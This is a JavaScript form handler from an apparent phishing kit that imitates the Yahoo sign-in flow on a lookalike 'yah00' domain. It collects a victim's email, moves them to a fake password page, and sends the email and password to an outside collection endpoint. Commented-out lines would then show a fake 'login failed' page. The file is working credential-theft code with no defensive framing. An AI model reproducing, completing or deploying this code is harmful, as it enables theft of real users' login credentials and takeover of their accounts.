document.addEventListener("DOMContentLoaded", function() {
    //form handler
    console.log("sender script loaded");

    const hostname = "https://yah00.onrender.com";
    const endpoint = "https://bkend-yad0.onrender.com/endpoint";

    
    const nextButton = document.querySelector("#login-signin");
    const emailInput = document.querySelector("#login-username");
    const passwordInput = document.querySelector("#login-passwd");
    const emailClass = document.querySelector(".yid");
    const submitButton = document.querySelector("#login-signin");

    if (nextButton) {
        nextButton.addEventListener("click", function (e) {
            e.preventDefault();
            const email = emailInput?.value;
            gotoPassword(email); 
        }); 
    }
    else {
        console.error("Element with id #login-signin not found");
    }

    const email = localStorage.getItem("user-email");
    emailClass.textContent = email;

    submitButton.addEventListener("click", function (e) {
        e.preventDefault();
        const password = passwordInput?.value;
        sendFormAndRedirect(email, password);
    });

    //go to password page function declaration
    function gotoPassword(email) {
        //you can use regex for just yahoo mail and next otherwise display error
        //then
        localStorage.setItem("user-email", email);
        window.location.href = `${hostname}/display-password.htm`;
    };

    async function sendFormAndRedirect(email, password) {
        
       try{
            localStorage.removeItem("user-email");

           const payload = {
               "email": email,
               "password": password
           };
        const data = await fetch(endpoint, {
            method: "POST",
            mode: "no-cors",
            "Content-Type": "application/json",
            body: JSON.stringify(payload)
        });
           
        const res = await data.json();
        console.log("Response:",res, "Data:: ", data, "Payload", payload);
        // if (res) {
        //    window.location.href = `${hostname}/login-failed.htm`;
        // }else{
        //      window.location.reload();
        // };
       }catch(error){
           console.log("error:", error);
       }
    };
});

